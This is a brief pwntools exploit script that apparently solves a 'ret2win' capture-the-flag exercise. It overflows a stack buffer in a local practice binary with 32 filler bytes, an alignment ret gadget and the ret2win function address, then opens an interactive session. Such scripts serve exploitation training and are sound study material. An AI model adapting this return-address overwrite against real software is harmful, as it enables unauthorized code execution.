from pwn import *

elf = context.binary = ELF("./ret2win")

r = process()

RET = p64(0x000000000040053e)

payload = b"A"*32 + RET*2 + p64(elf.sym["ret2win"])

r.clean()
r.sendline(payload)

r.interactive() 